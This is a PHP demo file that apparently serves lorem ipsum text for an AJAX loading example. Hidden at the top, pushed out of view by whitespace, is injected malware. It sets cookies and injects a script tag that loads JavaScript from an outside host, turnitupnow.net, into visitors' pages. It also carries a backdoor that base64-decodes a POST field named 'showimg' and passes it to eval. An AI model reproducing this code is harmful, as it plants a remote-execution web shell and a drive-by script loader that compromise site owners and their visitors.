<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

sleep(1);
?>
<p><strong>This content was loaded via ajax, though it took a second.</strong></p>
<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean nec turpis justo, et facilisis ligula. In congue interdum odio, a scelerisque eros posuere ac. Aenean massa tellus, dictum sit amet laoreet ut, aliquam in orci. Duis eu aliquam ligula. Nullam vel placerat ligula. Fusce venenatis viverra dictum. Phasellus dui dolor, imperdiet in sodales at, mattis sed libero. Morbi ac ipsum ligula. Quisque suscipit dui vel diam pretium nec cursus lacus malesuada. Donec sollicitudin, eros eget dignissim mollis, risus leo feugiat tellus, vel posuere nisl ipsum eu erat. Quisque posuere lacinia imperdiet. Quisque nunc leo, elementum quis ultricies et, vehicula sit amet turpis. Nullam sed nunc nec nibh condimentum mattis. Quisque sed ligula sit amet nisi ultricies bibendum eget id nisi.</p>
<p>Proin ut erat vel nunc tincidunt commodo. Curabitur feugiat, nisi et vehicula viverra, nisl orci eleifend arcu, sed blandit lectus nisl quis nisi. In hac habitasse platea dictumst. In hac habitasse platea dictumst. Aenean rutrum gravida velit ac imperdiet. Integer vitae arcu risus. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Proin tincidunt orci at leo egestas porta. Vivamus ac augue et enim bibendum hendrerit ut id urna. Donec sollicitudin pulvinar turpis vitae scelerisque. Etiam tempor porttitor est sed blandit. Phasellus varius consequat leo eget tincidunt. Aliquam ac dui lectus. In et consectetur orci. Duis posuere nulla ac turpis faucibus vestibulum. Sed ut velit et dolor rhoncus dapibus. Sed sit amet pellentesque est.</p>
<p>Nam in volutpat orci. Morbi sit amet orci in erat egestas dignissim. Etiam mi sapien, tempus sed iaculis a, adipiscing quis tellus. Suspendisse potenti. Nam malesuada tristique vestibulum. In tempor tellus dignissim neque consectetur eu vestibulum nisl pellentesque. Phasellus ultrices cursus velit, id aliquam nisl fringilla quis. Cras varius elit sed urna ultrices congue. Sed ornare odio sed velit pellentesque id varius nisl sodales. Sed auctor ligula egestas mi pharetra ut consectetur erat pharetra.</p>